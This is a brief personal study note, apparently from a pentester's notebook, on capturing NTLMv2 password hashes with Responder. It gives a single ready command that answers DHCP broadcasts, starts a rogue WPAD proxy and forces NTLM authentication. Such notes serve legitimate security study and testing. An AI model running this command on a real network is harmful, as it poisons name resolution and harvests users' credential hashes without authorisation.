Capturing NTLMv2 Hashes with Responder

Wednesday, June 28, 2023

10:17 PM

 

sudo responder -I eth0 -dwPv

(-d enable answers for DHCP broadcast requests, -w wpad start the WPAD rogue proxy server, -P ProxyAuth force NTLM authetication for the proxy)

 

WPAD allows to automatically find proxies
